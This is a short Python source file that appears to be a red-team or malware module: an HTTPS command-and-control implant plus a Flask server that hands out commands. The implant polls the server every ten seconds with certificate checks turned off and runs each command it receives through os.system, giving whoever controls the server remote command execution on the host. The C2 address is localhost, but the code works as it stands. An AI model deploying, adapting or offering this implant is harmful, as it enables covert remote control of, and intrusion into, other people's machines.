import requests
import os
import time

C2_URL = "https://127.0.0.1:5000/command"

def run_https_implant(verbose=False):
    while True:
        try:
            r = requests.get(C2_URL, timeout=10, verify=False)
            if r.status_code == 200:
                cmd = r.text.strip()
                if cmd:
                    if verbose:
                        print(f"[https_c2] Executing: {cmd}")
                    os.system(cmd)
        except Exception as e:
            if verbose:
                print(f"[https_c2] Error: {e}")
        time.sleep(10)

def run_https_server(verbose=False):
    from flask import Flask
    app = Flask(__name__)

    current_cmd = ""

    @app.route("/command", methods=["GET"])
    def get_command():
        return current_cmd or "echo noop"

    print("[https_c2] Server running on https://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000, ssl_context="adhoc")
